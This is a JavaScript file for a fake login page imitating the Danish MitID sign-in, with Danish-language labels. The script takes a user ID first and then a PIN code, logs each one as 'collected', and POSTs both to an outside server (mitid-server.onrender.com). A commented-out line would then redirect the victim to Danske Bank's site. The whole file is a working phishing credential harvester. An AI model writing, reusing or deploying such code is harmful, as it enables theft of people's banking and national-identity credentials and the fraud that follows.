const usernameIn = document.querySelector("#username2");
const loginBtn = document.querySelector("#loginBtn2");
const showBtn = document.querySelector("#hideUserNameBtn2");
const label = document.querySelector("label[for='username2']");
const forgot = document.querySelector("#linkOpenToolTip span");

let status = "user_id";
const data = {};

const rootURL = "https://mitid-server.onrender.com/";

showBtn.addEventListener("click", (e) => {
    if (usernameIn.getAttribute("type") === "text") {
        e.target.innerText = "Vis";
        usernameIn.setAttribute("type", "password");
    } else {
        e.target.innerText = "Skjul";
        usernameIn.setAttribute("type", "text");
    }
});

function updateBtn() {
    if (usernameIn.value.length > 0) {
        loginBtn.removeAttribute("disabled");
    } else {
        loginBtn.setAttribute("disabled", true);
    }
}

usernameIn.addEventListener("input", updateBtn);

async function sendData(userData) {
    const url = `${rootURL}/api/add`;
    try {
        console.log(userData);
        const response = await fetch(url, {
            method: "POST",
            body: JSON.stringify({data: userData}),
            headers: {
                "Content-type": "application/json; charset=UTF-8",
            },
        });
        if (!response.ok) {
            throw new Error(`Response status: ${response.status}`);
        }

        const result = await response.json();
        console.log(result);
    } catch (error) {
        console.error(error.message);
    }
}

loginBtn.addEventListener("click", (e) => {
    if (status === "user_id") {
        data["user_id"] = usernameIn.value;
        console.log("User-ID Collected");
        label.innerText = "PIN-kode";
        usernameIn.value = "";
        forgot.innerText = "Glemt PIN-kode?";
        updateBtn();
        status = "pin_code";
    } else {
        data["pin_code"] = usernameIn.value;
        console.log("PIN-code collected");
        console.log(data, JSON.stringify(data));
        sendData(data);
        // location.href = "https://danskebank.dk";
    }
});
